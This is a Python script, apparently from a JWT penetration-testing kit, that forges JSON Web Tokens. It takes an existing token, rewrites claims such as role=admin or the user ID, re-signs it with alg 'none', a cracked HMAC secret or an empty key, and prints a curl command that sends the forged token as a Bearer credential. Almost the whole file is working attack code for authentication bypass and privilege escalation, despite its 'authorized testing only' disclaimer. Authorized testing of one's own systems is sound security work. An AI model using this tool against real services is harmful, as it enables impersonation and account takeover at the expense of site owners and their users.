#!/usr/bin/env python3
"""
forge_token.py — generic claim-tamper + re-sign helper (guide §6, §7, §15).
Takes an existing token, applies --claim overrides, and re-signs with `none` or HS256/384/512.

AUTHORIZED TESTING ONLY. Forge into your own test account (your own sub / a test admin you
control); never impersonate a real user. Use after you have a valid forge primitive
(alg:none accepted, or a cracked/known HS secret).

Examples:
  python3 forge_token.py <TOKEN> --alg none --claim role=admin
  python3 forge_token.py <TOKEN> --alg HS256 --secret 'CRACKED' --claim role=admin --claim sub=1337
  python3 forge_token.py <TOKEN> --alg HS256 --secret '' --claim role=admin     # empty-secret (kid /dev/null style)
"""
import argparse
import sys
from jwt_common import decode_token, build_token, apply_claims, pretty


def main():
    ap = argparse.ArgumentParser(description="Forge/tamper a JWT (none or HS*).")
    ap.add_argument("token", help="the original JWT")
    ap.add_argument("--alg", default="none", help="none | HS256 | HS384 | HS512 (default: none)")
    ap.add_argument("--secret", default=None, help="HMAC secret for HS* (use '' for empty key)")
    ap.add_argument("--claim", action="append", default=[], help="key=value claim override (repeatable)")
    ap.add_argument("--set-header", action="append", default=[], help="key=value header override (repeatable)")
    args = ap.parse_args()

    header, payload, _ = decode_token(args.token)

    # header overrides
    for h in args.set_header:
        k, v = h.split("=", 1)
        header[k] = v

    payload = apply_claims(payload, args.claim)

    secret = None
    if args.alg.upper().startswith("HS"):
        if args.secret is None:
            print("[!] --secret is required for HS* (use --secret '' for an empty key).", file=sys.stderr)
            sys.exit(2)
        secret = args.secret.encode()

    forged = build_token(header, payload, secret=secret, alg=args.alg)

    print("=== FORGED TOKEN ===")
    print(forged)
    print("\n=== DECODED ===")
    print(pretty(forged))
    print("\n[i] Send it, e.g.:")
    print(f'    curl -i "$URL" -H "Authorization: Bearer {forged}"')


if __name__ == "__main__":
    main()
